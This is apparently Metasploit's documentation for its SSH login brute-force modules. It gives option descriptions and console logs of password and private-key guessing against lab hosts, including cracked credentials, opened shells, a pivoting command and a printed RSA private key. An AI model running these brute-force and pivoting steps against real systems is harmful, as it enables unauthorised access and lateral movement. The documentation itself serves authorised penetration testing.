## Vulnerable Application

SSH, Secure SHell, is an encrypted network protocol used to remotely interact with an Operating System at a command line
level. SSH is available on most every system, including Windows, but is mainly used by *nix administrators. This module
attempts to login to SSH with username and password combinations. It should be noted that some modern Operating Systems have default
configurations to not allow the `root` user to remotely login via SSH, or to only allow `root` to login with an SSH key
login.

## Verification Steps - Password Login

1. Install SSH and start it.
2. Start msfconsole
3. Do: ` use auxiliary/scanner/ssh/ssh_login`
4. Do: `set rhosts`
5. Do: set usernames and passwords via any of the available options
5. Do: `run`
6. You will hopefully see something similar to, followed by a session:

```
[+] SSH - Success: 'msfadmin:msfadmin' 'uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
```

### Key Generation

On most modern *nix Operating System, the `ssh-keygen` command can be utilized to create an SSH key. Metasploit
expects the key to be unencrypted, so no password should be set during `ssh-keygen`.   After following the prompts to
create the SSH key pair, the `pub` key needs to be added to the authorized_keys list. To do so simply run: `cat
~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys`

## Verification Steps - SSH key login

1. Install SSH and start it.
2. Create an SSH keypair and add the public key to the `authorized_keys` file
3. Start msfconsole
4. Do: ` use auxiliary/scanner/ssh/ssh_login_pubkey`
5. Do: `set rhosts`
6. Do: set usernames with one of the available options
7. Do: set private keys with one or both of the available options
1. Do: `set KEY_PATH ` to either a file or path
2. Do: `set PRIVATE_KEY ` to `file:PRIVATE_KEY_PATH`
8. Do: `run`
9. You will hopefully see something similar to the following:

```
[+] SSH - Success: 'ubuntu:-----BEGIN RSA PRIVATE KEY-----
```

### Session Capabilities

Like Meterpreter sessions, this newly established session can be used to pivot connections as defined by Metasploit's
routing table. To forward all new TCP connections through the session run `route add 0.0.0.0 0.0.0.0 -1`. This leverages
the TCP forwarding capabilities of the remote SSH server. UDP forwarding is not supported by SSH servers, so any UDP
traffic will fail.

TCP forwarding requires the `AllowTcpForwarding` option to be enabled in the server's configuration file, which is often
the default. If the option is disabled or the more specific `PermitOpen` option does not allow the connection to be
made, the connection will fail with the `administratively prohibited` error.

## Options

### BLANK_PASSWORD

Boolean value on if an additional login attempt should be attempted with an empty password for every user.

### PASSWORD

Password to try for each user.

### PASS_FILE

A file containing a password on every line. Kali linux example: `/usr/share/wordlists/metasploit/password.lst`

### STOP_ON_SUCCESS

If a valid login is found on a host, immediately stop attempting additional logins on that host.

### USERNAME

Username to try for each password.

### USERPASS_FILE

A file containing a username and password, separated by a space, on every line. An example line would be `username
password`.

### USER_AS_PASS

Boolean value on if an additional login attempt should be attempted with the password as the username.

### USER_FILE

A file containing a username on every line.

### KEY_PATH

A string to the private key to attempt, or a folder containing private keys to attempt. Any file name starting with a
period (`.`) or ending in `.pub` will be ignored. An SSH key is typically kept in a user's home directory under
`.ssh/id_rsa`. The file contents, when not encrypted with a password will start with `-----BEGIN RSA PRIVATE KEY-----`

### PRIVATE_KEY

A string of the private key to attempt. For MSFConsole users the option should be set to `file:PRIVATE_KEY_PATH` and it
will read in the string value of the private key. Currently OpenSSH, RSA, DSA, and ECDSA private keys are supported.

### VERBOSE

Show a failed login attempt. This can get rather verbose when large `USER_FILE`s or `PASS_FILE`s are used. A failed
attempt will look similar to the following:

```
[-] SSH - Failed: 'msfadmin:virtual'
```

## Option Combinations

It is important to note that usernames and passwords can be entered in multiple combinations. For instance, a password
could be set in `PASSWORD`, be part of either `PASS_FILE` or `USERPASS_FILE`, be guessed via `USER_AS_PASS` or
`BLANK_PASSWORDS`. This module makes a combination of all of the above when attempting logins. So if a password is set
in `PASSWORD`, and a `PASS_FILE` is listed, passwords will be generated from BOTH of these.

## Scenarios - Password Login

Example run against:

* Ubuntu 14.04 Server with root login permitted: 192.168.2.156
* Ubuntu 16.04 Server: 192.168.2.137
* Metasploitable: 192.168.2.46
* Metasploitable 2: 192.168.2.35

```
msf > use auxiliary/scanner/ssh/ssh_login
msf auxiliary(ssh_login) > cat /root/ssh_passwords.lst
[*] exec: cat /root/ssh_passwords.lst

msfadmin
badpassword
root
ubuntu

msf auxiliary(ssh_login) > set pass_file /root/ssh_passwords.lst
pass_file => /root/ssh_passwords.lst
msf auxiliary(ssh_login) > cat /root/ssh_un.lst
[*] exec: cat /root/ssh_un.lst

msfadmin
badpassword
root
ubuntu

msf auxiliary(ssh_login) > set user_file /root/ssh_un.lst
user_file => /root/ssh_un.lst
msf auxiliary(ssh_login) > cat /root/ssh_hosts.lst
[*] exec: cat /root/ssh_hosts.lst

192.168.2.156
192.168.2.137
192.168.2.35
192.168.2.46
msf auxiliary(ssh_login) > set rhosts file:/root/ssh_hosts.lst
rhosts => file:/root/ssh_hosts.lst
msf auxiliary(ssh_login) > set verbose false
verbose => false
msf auxiliary(ssh_login) > set threads 4
threads => 4
msf auxiliary(ssh_login) > exploit

[*] SSH - Starting bruteforce
[*] SSH - Starting bruteforce
[*] SSH - Starting bruteforce
[*] SSH - Starting bruteforce
[+] SSH - Success: 'msfadmin:msfadmin' 'uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
[+] SSH - Success: 'msfadmin:msfadmin' 'uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
[*] Command shell session 5 opened (192.168.2.117:44415 -> 192.168.2.46:22) at 2017-02-22 20:26:13 -0500
[*] Command shell session 6 opened (192.168.2.117:36107 -> 192.168.2.35:22) at 2017-02-22 20:26:13 -0500
[+] SSH - Success: 'root:ubuntu' 'uid=0(root) gid=0(root) groups=0(root) Linux Ubuntu14 4.2.0-27-generic #32~14.04.1-Ubuntu SMP Fri Jan 22 15:32:26 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux '
[*] Command shell session 7 opened (192.168.2.117:32829 -> 192.168.2.156:22) at 2017-02-22 20:26:35 -0500
[+] SSH - Success: 'ubuntu:ubuntu' 'uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare) Linux Ubuntu14 4.2.0-27-generic #32~14.04.1-Ubuntu SMP Fri Jan 22 15:32:26 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux '
[*] Command shell session 8 opened (192.168.2.117:42205 -> 192.168.2.156:22) at 2017-02-22 20:26:42 -0500
[+] SSH - Success: 'ubuntu:ubuntu' 'uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare) Linux ubuntu 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux '
[*] Command shell session 9 opened (192.168.2.117:37027 -> 192.168.2.137:22) at 2017-02-22 20:26:44 -0500
[*] Scanned 3 of 4 hosts (75% complete)
[*] Scanned 4 of 4 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(ssh_login) > sessions -l

Active sessions
===============

  Id  Type          Information                              Connection
  --  ----          -----------                              ----------
  5   shell /linux  SSH msfadmin:msfadmin (192.168.2.46:22)  192.168.2.117:44415 -> 192.168.2.46:22 (192.168.2.46)
  6   shell /linux  SSH msfadmin:msfadmin (192.168.2.35:22)  192.168.2.117:36107 -> 192.168.2.35:22 (192.168.2.35)
  7   shell /linux  SSH root:ubuntu (192.168.2.156:22)       192.168.2.117:32829 -> 192.168.2.156:22 (192.168.2.156)
  8   shell /linux  SSH ubuntu:ubuntu (192.168.2.156:22)     192.168.2.117:42205 -> 192.168.2.156:22 (192.168.2.156)
  9   shell /linux  SSH ubuntu:ubuntu (192.168.2.137:22)     192.168.2.117:37027 -> 192.168.2.137:22 (192.168.2.137)
```

Example run against:

* Windows 10 w/ Linux Subsystem

```
msf > use auxiliary/scanner/ssh/ssh_login
msf auxiliary(ssh_login) > set rhosts 192.168.2.140
rhosts => 192.168.2.140
msf auxiliary(ssh_login) > set username winuser
username => winuser
msf auxiliary(ssh_login) > set password "badpassword"
password => badpassword
msf auxiliary(ssh_login) > exploit

[*] SSH - Starting bruteforce
[+] SSH - Success: 'winuser:badpassword' ''
[!] No active DB -- Credential data will not be saved!
[*] Command shell session 1 opened (192.168.2.117:42227 -> 192.168.2.140:22) at 2017-02-22 20:40:12 -0500
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(ssh_login) > sessions -l

Active sessions
===============

  Id  Type     Information                               Connection
  --  ----     -----------                               ----------
  1   shell /  SSH winuser:badpassword (192.168.2.140:22)  192.168.2.117:42227 -> 192.168.2.140:22 (192.168.2.140)

```

Example run against:

* Windows 10 w/ Bitvise SSH Server (WinSSHD) version 7.26-r2 and a virtual account created

It is important to note here that the module gives back a **Success**, but then errors when trying to identify the
remote system. This should be enough info to manually exploit via a regular SSH command.

```
msf > use auxiliary/scanner/ssh/ssh_login
msf auxiliary(ssh_login) > set rhosts 192.168.2.140
rhosts => 192.168.2.140
msf auxiliary(ssh_login) > set username virtual
username => virtual
msf auxiliary(ssh_login) > set password virtual
password => virtual
msf auxiliary(ssh_login) > exploit

[*] SSH - Starting bruteforce
[+] SSH - Success: 'virtual:virtual' 'id: Command not found.  help ?: Command not found.  '
[!] No active DB -- Credential data will not be saved!
[*] 192.168.2.140 - Command shell session 4 closed.  Reason: Died from EOFError
[*] Command shell session 4 opened (192.168.2.117:36169 -> 192.168.2.140:22) at 2017-02-22 21:20:24 -0500
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Scenarios - SSH key login

Example run with a FOLDER set for `KEY_PATH` against:

* Ubuntu 14.04 Server

While the two SSH key are nearly identical, one character has been modified in one of the keys to prevent a successful
login.

```
msf > use auxiliary/scanner/ssh/ssh_login_pubkey 
msf auxiliary(ssh_login_pubkey) > set rhosts 192.168.2.156
rhosts => 192.168.2.156
msf auxiliary(ssh_login_pubkey) > set username ubuntu
username => ubuntu
msf auxiliary(ssh_login_pubkey) > set key_path /root/sshkeys/
key_path => /root/sshkeys/
msf auxiliary(ssh_login_pubkey) > run

[*] 192.168.2.156:22 SSH - Testing Cleartext Keys
[*] SSH - Testing 2 keys from /root/sshkeys
[-] SSH - Failed: 'ubuntu:-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAtwJrqowPyjWONHUCMqU/Fh3yRn42+X9hahtTv/6plYpb4WrA
NxDaYIrBGAO//u2SkGcIhnAdzYVmovWahKEwcxZ2XJo/nj4gjh1CbI1xVCFeE/oX
oWpIN+4q8JQ0Iq1dm+c+WPQIEzlVpMRaKeuMxdGPNMTYWxolSEIMPPYmyWXG6gz8
fYYZDo8+w8G78w7oUV6hSIwCDzw09A5yGyt51ZETeSZiZ24bHlBQSyk7yFq/eo58
xhlc79jpZrSdX8kx8HrCZKND7O6E4YSktfSHOvd81QUCSyoi5Y+9RXsLjUEba0+Y
aAz8mZPLdxbRu75eeD/mZTv5gALewXeb65IkPQIDAQABAoIBACvi5LbNR6wSE7v4
o0JJ5ksDe2n0MnK6XT34t6i/BSPbPhVcaCPMYtHr9Eox/ATCK/d8/cpfcIYsi2Rg
yWEs1lWC+XdTdhYYh+4MjjVB5f9q0QixXKFUv2TKNHnk0GvQbzZHyefC/Xy+rw8I
FyceWW/GxTS+T7PpHS+qxwyHat24ph7Xz/cE/0UyrVu+NAzFXaHq60M2/RRh3uXE
1vqiZVlapczO/DxsnPwQrE2EOm0lzrQVmZbX5BYK1yiCd5eTgLhOb+ms2p/8pb2I
jrK5FzLnUZu0H0ZHtihOVkx4l8NZqB36jinaRs0wWN7It4/C5+NkyoMvuceIn1Wx
tstYD3ECgYEA7sOb0CdGxXw0IVrJF+3C8m1UG3CfQfzms+rJb9w3OJVl2BTlYdPr
JgXI/YoV9FQPvXmTWrRP9e6x0kuSVHO1ejMpyLHGmMcJDZhpVKMROOosIWfROxwk
bkPU2jdUXIrHgu8NnmnyytjUnJgeerQZLhCtjKmBKCZisS4WPBdun3MCgYEAxDh1
fjFJttWhgeg6pcvvmDUWO1W0lJ9ZjjQll1UmbPmKDGwwsjPZEkZfLkvI77st81AT
eW/p7tMKE3fCkXkn2KWMQ6ZGN5yflwvjJOMAVZz8ir8Cu1npa6f6HIrxpHSKethY
dG4ssCpQctfoRfN4wg6fOHBOpGd3BH1GdOwR4Y8CgYEAq3h7e//ZCZbrcVDbvn2Y
VbZCgvpcxW002d0yEU2bst1IKOjI23rwE3xwHfV/UtrT+wVG2AtKqZpkxlxTmKcI
m9wGlAVoVOwMCmF8s7XwdmlmjA8c6lCJsU6xnI3D3jokklnP9AauwRL7jgKJUSHq
O3TqzmwlP4phslEg0sMZRRUCgYEAwkS3prG7rqYBmjFG52FqnIJquWIYQFEoBE+C
rDqkqZ3B3Jy89aG5l4tOrvJfRWJHky7DqSZxMH+G6VFXtFmEZs04er3DpUmPA6fE
Qn/wk9KygdetJ7pUDL8pNFsn9M9hT1Ck+tkdq2ipb5ptn9v2wgJiBynB4qmBP1Oc
jyQua+cCgYEAl77hJQK97tdJ5TuOXSsdpW8IMvbiaWTgvZtKVJev31lWgJ+knpCf
AaZna5YokhaNvfGGbO5N8YoYShIpGdvWI+dIT8xYvPkJmYdnTz7/dmBUcwLtNVx/
7PI/l5XrFMRsnu/CYuBPuWB+RCTLjIr1D1RluNbIb7xr+kDHuzgInvA=
-----END RSA PRIVATE KEY-----

'
[!] No active DB -- Credential data will not be saved!
[+] SSH - Success: 'ubuntu:-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAtwJrqowPyjWONHUCMqU/Fh3yRn42+X9hahtTv/6plYpb4WrA
NxDaYIrBGAO//u2SkGcIhnAdzYVmovWahKEwcxZ2XJo/nj4gjh1CbI1xVCFeE/oX
oWpIN+4q8JQ0Iq1dm+c+WPQIEzlVpMRaKeuMxdGPNMTYWxolSEIMPPYmyWXG6gz8
fYYZDo8+w8G78w7oUV6hSIwCDzw09A5yGyt51ZETeSZiZ24bHlBQSyk7yFq/eo58
xhlc79jpZrSdX8kx8HrCZKND7O6E4YSktfSHOvd81QUCSyoi5Y+9RXsLjUEba0+Y
0Az8mZPLdxbRu75eeD/mZTv5gALewXeb65IkPQIDAQABAoIBACvi5LbNR6wSE7v4
o0JJ5ksDe2n0MnK6XT34t6i/BSPbPhVcaCPMYtHr9Eox/ATCK/d8/cpfcIYsi2Rg
yWEs1lWC+XdTdhYYh+4MjjVB5f9q0QixXKFUv2TKNHnk0GvQbzZHyefC/Xy+rw8I
FyceWW/GxTS+T7PpHS+qxwyHat24ph7Xz/cE/0UyrVu+NAzFXaHq60M2/RRh3uXE
1vqiZVlapczO/DxsnPwQrE2EOm0lzrQVmZbX5BYK1yiCd5eTgLhOb+ms2p/8pb2I
jrK5FzLnUZu0H0ZHtihOVkx4l8NZqB36jinaRs0wWN7It4/C5+NkyoMvuceIn1Wx
tstYD3ECgYEA7sOb0CdGxXw0IVrJF+3C8m1UG3CfQfzms+rJb9w3OJVl2BTlYdPr
JgXI/YoV9FQPvXmTWrRP9e6x0kuSVHO1ejMpyLHGmMcJDZhpVKMROOosIWfROxwk
bkPU2jdUXIrHgu8NnmnyytjUnJgeerQZLhCtjKmBKCZisS4WPBdun3MCgYEAxDh1
fjFJttWhgeg6pcvvmDUWO1W0lJ9ZjjQll1UmbPmKDGwwsjPZEkZfLkvI77st81AT
eW/p7tMKE3fCkXkn2KWMQ6ZGN5yflwvjJOMAVZz8ir8Cu1npa6f6HIrxpHSKethY
dG4ssCpQctfoRfN4wg6fOHBOpGd3BH1GdOwR4Y8CgYEAq3h7e//ZCZbrcVDbvn2Y
VbZCgvpcxW002d0yEU2bst1IKOjI23rwE3xwHfV/UtrT+wVG2AtKqZpkxlxTmKcI
m9wGlAVoVOwMCmF8s7XwdmlmjA8c6lCJsU6xnI3D3jokklnP9AauwRL7jgKJUSHq
O3TqzmwlP4phslEg0sMZRRUCgYEAwkS3prG7rqYBmjFG52FqnIJquWIYQFEoBE+C
rDqkqZ3B3Jy89aG5l4tOrvJfRWJHky7DqSZxMH+G6VFXtFmEZs04er3DpUmPA6fE
Qn/wk9KygdetJ7pUDL8pNFsn9M9hT1Ck+tkdq2ipb5ptn9v2wgJiBynB4qmBP1Oc
jyQua+cCgYEAl77hJQK97tdJ5TuOXSsdpW8IMvbiaWTgvZtKVJev31lWgJ+knpCf
AaZna5YokhaNvfGGbO5N8YoYShIpGdvWI+dIT8xYvPkJmYdnTz7/dmBUcwLtNVx/
7PI/l5XrFMRsnu/CYuBPuWB+RCTLjIr1D1RluNbIb7xr+kDHuzgInvA=
-----END RSA PRIVATE KEY-----

' 'uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare) Linux Ubuntu14 4.2.0-27-generic #32~14.04.1-Ubuntu SMP Fri Jan 22 15:32:26 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux '
[*] Command shell session 1 opened (192.168.2.117:44179 -> 192.168.2.156:22) at 2017-02-22 22:08:11 -0500
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Similar example but run with a KEY FILE set for `PRIVATE_KEY`:

```
msf > use auxiliary/scanner/ssh/ssh_login_pubkey 
msf auxiliary(ssh_login_pubkey) > set rhosts 192.168.2.156
rhosts => 192.168.2.156
msf auxiliary(ssh_login_pubkey) > set username ubuntu
username => ubuntu
msf auxiliary(ssh_login_pubkey) > set private_key file:/root/sshkeys/id_rsa
private_key => -----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAtwJrqowPyjWONHUCMqU/Fh3yRn42+X9hahtTv/6plYpb4WrA
NxDaYIrBGAO//u2SkGcIhnAdzYVmovWahKEwcxZ2XJo/nj4gjh1CbI1xVCFeE/oX
oWpIN+4q8JQ0Iq1dm+c+WPQIEzlVpMRaKeuMxdGPNMTYWxolSEIMPPYmyWXG6gz8
fYYZDo8+w8G78w7oUV6hSIwCDzw09A5yGyt51ZETeSZiZ24bHlBQSyk7yFq/eo58
xhlc79jpZrSdX8kx8HrCZKND7O6E4YSktfSHOvd81QUCSyoi5Y+9RXsLjUEba0+Y
0Az8mZPLdxbRu75eeD/mZTv5gALewXeb65IkPQIDAQABAoIBACvi5LbNR6wSE7v4
o0JJ5ksDe2n0MnK6XT34t6i/BSPbPhVcaCPMYtHr9Eox/ATCK/d8/cpfcIYsi2Rg
yWEs1lWC+XdTdhYYh+4MjjVB5f9q0QixXKFUv2TKNHnk0GvQbzZHyefC/Xy+rw8I
FyceWW/GxTS+T7PpHS+qxwyHat24ph7Xz/cE/0UyrVu+NAzFXaHq60M2/RRh3uXE
1vqiZVlapczO/DxsnPwQrE2EOm0lzrQVmZbX5BYK1yiCd5eTgLhOb+ms2p/8pb2I
jrK5FzLnUZu0H0ZHtihOVkx4l8NZqB36jinaRs0wWN7It4/C5+NkyoMvuceIn1Wx
tstYD3ECgYEA7sOb0CdGxXw0IVrJF+3C8m1UG3CfQfzms+rJb9w3OJVl2BTlYdPr
JgXI/YoV9FQPvXmTWrRP9e6x0kuSVHO1ejMpyLHGmMcJDZhpVKMROOosIWfROxwk
bkPU2jdUXIrHgu8NnmnyytjUnJgeerQZLhCtjKmBKCZisS4WPBdun3MCgYEAxDh1
fjFJttWhgeg6pcvvmDUWO1W0lJ9ZjjQll1UmbPmKDGwwsjPZEkZfLkvI77st81AT
eW/p7tMKE3fCkXkn2KWMQ6ZGN5yflwvjJOMAVZz8ir8Cu1npa6f6HIrxpHSKethY
dG4ssCpQctfoRfN4wg6fOHBOpGd3BH1GdOwR4Y8CgYEAq3h7e//ZCZbrcVDbvn2Y
VbZCgvpcxW002d0yEU2bst1IKOjI23rwE3xwHfV/UtrT+wVG2AtKqZpkxlxTmKcI
m9wGlAVoVOwMCmF8s7XwdmlmjA8c6lCJsU6xnI3D3jokklnP9AauwRL7jgKJUSHq
O3TqzmwlP4phslEg0sMZRRUCgYEAwkS3prG7rqYBmjFG52FqnIJquWIYQFEoBE+C
rDqkqZ3B3Jy89aG5l4tOrvJfRWJHky7DqSZxMH+G6VFXtFmEZs04er3DpUmPA6fE
Qn/wk9KygdetJ7pUDL8pNFsn9M9hT1Ck+tkdq2ipb5ptn9v2wgJiBynB4qmBP1Oc
jyQua+cCgYEAl77hJQK97tdJ5TuOXSsdpW8IMvbiaWTgvZtKVJev31lWgJ+knpCf
AaZna5YokhaNvfGGbO5N8YoYShIpGdvWI+dIT8xYvPkJmYdnTz7/dmBUcwLtNVx/
7PI/l5XrFMRsnu/CYuBPuWB+RCTLjIr1D1RluNbIb7xr+kDHuzgInvA=
-----END RSA PRIVATE KEY-----
msf auxiliary(ssh_login_pubkey) > run

[*] 192.168.2.156:22 SSH - Testing Cleartext Keys
[*] SSH - Testing 1 keys from
[+] SSH - Success: 'ubuntu:-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAtwJrqowPyjWONHUCMqU/Fh3yRn42+X9hahtTv/6plYpb4WrA
NxDaYIrBGAO//u2SkGcIhnAdzYVmovWahKEwcxZ2XJo/nj4gjh1CbI1xVCFeE/oX
oWpIN+4q8JQ0Iq1dm+c+WPQIEzlVpMRaKeuMxdGPNMTYWxolSEIMPPYmyWXG6gz8
fYYZDo8+w8G78w7oUV6hSIwCDzw09A5yGyt51ZETeSZiZ24bHlBQSyk7yFq/eo58
xhlc79jpZrSdX8kx8HrCZKND7O6E4YSktfSHOvd81QUCSyoi5Y+9RXsLjUEba0+Y
0Az8mZPLdxbRu75eeD/mZTv5gALewXeb65IkPQIDAQABAoIBACvi5LbNR6wSE7v4
o0JJ5ksDe2n0MnK6XT34t6i/BSPbPhVcaCPMYtHr9Eox/ATCK/d8/cpfcIYsi2Rg
yWEs1lWC+XdTdhYYh+4MjjVB5f9q0QixXKFUv2TKNHnk0GvQbzZHyefC/Xy+rw8I
FyceWW/GxTS+T7PpHS+qxwyHat24ph7Xz/cE/0UyrVu+NAzFXaHq60M2/RRh3uXE
1vqiZVlapczO/DxsnPwQrE2EOm0lzrQVmZbX5BYK1yiCd5eTgLhOb+ms2p/8pb2I
jrK5FzLnUZu0H0ZHtihOVkx4l8NZqB36jinaRs0wWN7It4/C5+NkyoMvuceIn1Wx
tstYD3ECgYEA7sOb0CdGxXw0IVrJF+3C8m1UG3CfQfzms+rJb9w3OJVl2BTlYdPr
JgXI/YoV9FQPvXmTWrRP9e6x0kuSVHO1ejMpyLHGmMcJDZhpVKMROOosIWfROxwk
bkPU2jdUXIrHgu8NnmnyytjUnJgeerQZLhCtjKmBKCZisS4WPBdun3MCgYEAxDh1
fjFJttWhgeg6pcvvmDUWO1W0lJ9ZjjQll1UmbPmKDGwwsjPZEkZfLkvI77st81AT
eW/p7tMKE3fCkXkn2KWMQ6ZGN5yflwvjJOMAVZz8ir8Cu1npa6f6HIrxpHSKethY
dG4ssCpQctfoRfN4wg6fOHBOpGd3BH1GdOwR4Y8CgYEAq3h7e//ZCZbrcVDbvn2Y
VbZCgvpcxW002d0yEU2bst1IKOjI23rwE3xwHfV/UtrT+wVG2AtKqZpkxlxTmKcI
m9wGlAVoVOwMCmF8s7XwdmlmjA8c6lCJsU6xnI3D3jokklnP9AauwRL7jgKJUSHq
O3TqzmwlP4phslEg0sMZRRUCgYEAwkS3prG7rqYBmjFG52FqnIJquWIYQFEoBE+C
rDqkqZ3B3Jy89aG5l4tOrvJfRWJHky7DqSZxMH+G6VFXtFmEZs04er3DpUmPA6fE
Qn/wk9KygdetJ7pUDL8pNFsn9M9hT1Ck+tkdq2ipb5ptn9v2wgJiBynB4qmBP1Oc
jyQua+cCgYEAl77hJQK97tdJ5TuOXSsdpW8IMvbiaWTgvZtKVJev31lWgJ+knpCf
AaZna5YokhaNvfGGbO5N8YoYShIpGdvWI+dIT8xYvPkJmYdnTz7/dmBUcwLtNVx/
7PI/l5XrFMRsnu/CYuBPuWB+RCTLjIr1D1RluNbIb7xr+kDHuzgInvA=
-----END RSA PRIVATE KEY-----

' 'uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare) Linux Ubuntu14 4.2.0-27-generic #32~14.04.1-Ubuntu SMP Fri Jan 22 15:32:26 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux '
[*] Command shell session 1 opened (192.168.2.117:44179 -> 192.168.2.156:22) at 2017-02-22 22:08:11 -0500
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

